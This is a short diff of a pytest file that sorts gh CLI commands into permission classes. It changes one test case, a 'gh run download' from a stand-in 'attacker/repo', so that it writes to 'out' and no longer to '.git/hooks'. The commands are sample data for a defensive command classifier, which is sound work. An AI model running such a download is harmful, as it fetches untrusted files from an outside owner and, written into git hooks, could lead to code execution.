@@ -344,7 +344,7 @@ def test_reads_and_local_changes_are_allowed_in_any_form(command: str) -> None:
         ),
         pytest.param("gh api -X POST repos/furedea/r/actions/runs/1/rerun", "class D", id="a REST rerun"),
         pytest.param(
-            "gh run download 123 -R attacker/repo -D .git/hooks",
+            "gh run download 123 -R attacker/repo -D out",
             "class C",
             id="a download from another owner, which writes files",
         ),
